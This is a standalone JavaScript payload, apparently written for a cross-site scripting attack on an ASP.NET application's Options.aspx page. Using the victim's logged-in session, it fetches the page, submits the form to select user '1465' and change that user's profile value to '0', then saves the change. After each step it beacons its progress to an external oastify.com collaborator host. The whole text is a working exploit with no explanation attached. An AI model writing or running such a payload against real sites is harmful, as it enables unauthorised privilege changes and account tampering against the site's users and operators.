(async () => {
  const C = 'https://kaym8xz903sg0oepb9mbf1so9ff53u.oastify.com/';
  const beak = s => { try { new Image().src = C + s + '?t=' + Date.now(); } catch (e) {} };
  beak('fired3');
  const U = '/PC/Options.aspx?param=616a586f65422f51612f6c5266757647477639626e513d3d';
  const TARGET = '1465', PERFIL = '0';
  const postR = (u, fd) => fetch(u, {method:'POST', credentials:'include',
    headers:{'Content-Type':'application/x-www-form-urlencoded'}, body:new URLSearchParams(fd)});
  const F = h => { const d = new DOMParser().parseFromString(h,'text/html');
    return d.querySelector('form'); };
  try {
    const h1 = await (await fetch(U,{credentials:'include'})).text();
    let f = F(h1);
    beak('got-' + (f?'FORM':'NOFORM') + '-len' + h1.length);
    if (!f) return;
    let fd = new FormData(f);
    fd.set('__EVENTTARGET','m_lstNom'); fd.set('__EVENTARGUMENT',''); fd.set('m_lstNom',TARGET);
    const h2 = await (await postR(U,fd)).text();
    f = F(h2);
    const p = (h2.match(/m_lstPerfil[\s\S]*?selected[^>]*value="(\d)"/)||[])[1];
    beak('sel-' + (f?'FORM':'NOFORM') + '-perfil' + p);
    if (!f) return;
    fd = new FormData(f);
    fd.set('__EVENTTARGET',''); fd.set('__EVENTARGUMENT','');
    fd.set('m_lstNom',TARGET); fd.set('m_lstPerfil',PERFIL); fd.set('m_btnGuardar','Guardar');
    const h3 = await (await postR(U,fd)).text();
    beak('saved-len' + h3.length);
  } catch (e) { beak('err-' + encodeURIComponent(((e&&e.message)||e)+'').slice(0,80)); }
})();
